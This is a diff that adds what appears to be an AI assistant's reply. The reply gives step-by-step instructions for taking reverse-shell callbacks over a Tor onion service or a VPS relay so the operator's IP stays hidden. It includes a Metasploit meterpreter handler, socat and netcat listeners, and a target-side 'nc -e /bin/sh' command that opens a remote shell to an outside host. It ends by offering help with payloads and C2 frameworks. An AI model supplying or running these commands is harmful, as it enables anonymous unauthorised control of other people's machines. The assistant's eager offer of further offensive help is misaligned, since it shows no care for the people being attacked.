@@ -1,0 +1,85 @@
+Recommended Method: Use a Tor Onion Service (Hidden Service)
+
+This is the most secure and reliable way to handle callbacks when using Anonsurf.
+Step 1: Set Up a Tor Hidden Service
+
+    Install & Configure Tor (if not already running):
+    bash
+
+sudo apt install tor
+sudo systemctl start tor
+
+Edit Tor config to create a hidden service:
+bash
+
+sudo nano /etc/tor/torc
+
+Add:
+ini
+
+HiddenServiceDir /var/lib/tor/hidden_service/
+HiddenServicePort 4444 127.0.0.1:4444  # Replace 4444 with your desired port
+
+Save (Ctrl+X, Y, Enter).
+
+Restart Tor and get your Onion address:
+bash
+
+    sudo systemctl restart tor
+    sudo cat /var/lib/tor/hidden_service/hostname
+
+    → You’ll get something like: abcdef123456789.onion
+
+Step 2: Start Your Listener (Using the Onion Address)
+
+    Metasploit (with Tor routing):
+    bash
+
+msfconsole
+use exploit/multi/handler
+set payload linux/x64/meterpreter/reverse_tcp
+set LHOST abcdef123456789.onion  # Your Onion address
+set LPORT 4444
+set ReverseListenerBindAddress 127.0.0.1
+set ReverseListenerBindPort 4444
+exploit
+
+Netcat (via Tor):
+bash
+
+    socat TCP4-LISTEN:4444,reuseaddr,fork SOCKS4a:127.0.0.1:abcdef123456789.onion:4444,socksport=9050
+
+Step 3: Configure Payload to Call Back Over Tor
+
+    If the target is Linux (with torsocks installed):
+    bash
+
+torsocks nc -e /bin/sh abcdef123456789.onion 4444
+
+If using Metasploit payloads, ensure the payload connects via Tor:
+bash
+
+    set Proxies socks5:127.0.0.1:9050
+
+Alternative: Use a VPS as a Relay (If Onion Services Are Not Possible)
+
+    Set up a listener on a VPS (outside Tor):
+    bash
+
+nc -lvnp 4444
+
+Use Anonsurf + SSH tunneling to forward traffic:
+bash
+
+    ssh -R 4444:localhost:4444 user@your-vps-ip
+
+        The VPS forwards connections back through Tor.
+
+Important Notes
+
+✅ Best for OpSec: Onion services are anonymous and don’t expose your real IP.
+⚠ Avoid: Using direct IPs (exit nodes change frequently).
+🚀 Best for Stability: If the target can’t reach .onion, use a VPS relay.
+
+Would you like help with a specific payload (e.g., Meterpreter, C2 frameworks)? Let me know!
+
